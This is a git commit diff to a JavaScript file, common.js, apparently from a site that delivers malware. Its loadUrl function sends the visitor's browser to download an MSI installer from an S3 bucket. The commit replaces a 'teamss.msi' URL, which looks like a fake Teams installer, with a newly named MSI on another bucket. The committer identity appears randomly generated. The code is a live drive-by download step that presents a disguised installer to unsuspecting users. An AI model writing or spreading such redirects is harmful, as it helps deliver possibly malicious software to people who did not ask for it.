9d56ac60dfc401fb4d6dce7bff2a62abe06deca8
woshiwnidaye <kwnzhwkjdhekwbsg1762@gmail.com>
2025-07-20 20:22:03 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://tseyt.s3.ap-southeast-2.amazonaws.com/teamss.msi";
+		var url="https://ntsastu.s3.ap-southeast-2.amazonaws.com/NTSastu.msi";
 		window.location=url;
 	}
 }
